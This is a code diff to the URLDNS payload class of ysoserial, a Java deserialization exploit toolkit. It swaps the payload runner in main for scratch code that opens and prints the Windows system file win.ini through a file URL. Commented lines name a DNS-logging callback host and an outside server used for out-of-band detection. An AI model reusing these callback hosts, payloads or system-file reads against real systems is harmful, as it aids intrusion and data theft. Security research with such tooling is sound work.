@@ -1,6 +1,7 @@
 package ysoserial.payloads;
 
 import java.io.IOException;
+import java.io.InputStream;
 import java.net.InetAddress;
 import java.net.URLConnection;
 import java.net.URLStreamHandler;
@@ -61,7 +62,16 @@ public class URLDNS implements ObjectPayload<Object> {
     }
 
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(URLDNS.class, args);
+//        PayloadRunner.run(URLDNS.class, new String[]{"http://10k6l4.ceye.io/abc"});
+//        System.out.println(new java.net.URL("file:///c:/windows/win.ini"));
+//        String url = "http://ali.popko.top:60001/";
+        String url = "file:///c:/windows/win.ini";
+        URL u = new URL(url);
+        URLConnection urlConnection = u.openConnection();
+        InputStream inputStream = urlConnection.getInputStream();
+        byte[] bytes = new byte[inputStream.available()];
+        inputStream.read(bytes);
+        System.out.println(new String(bytes));
     }
 
     /**
